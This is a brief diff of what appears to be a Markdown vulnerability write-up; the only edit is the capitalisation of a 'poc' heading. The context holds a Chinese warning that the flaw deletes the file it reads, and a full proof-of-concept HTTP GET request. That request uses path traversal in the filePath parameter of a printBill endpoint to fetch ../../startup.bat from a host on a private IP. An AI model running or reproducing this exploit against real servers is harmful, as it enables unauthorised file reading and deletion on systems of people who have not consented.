@@ -2,7 +2,7 @@
 
 `注意：这个漏洞在读取文件的时候，会将原来的文件删除，谨慎使用。`
 
-## poc
+## POC
 ```
 GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
 Host: 192.168.63.129:8088
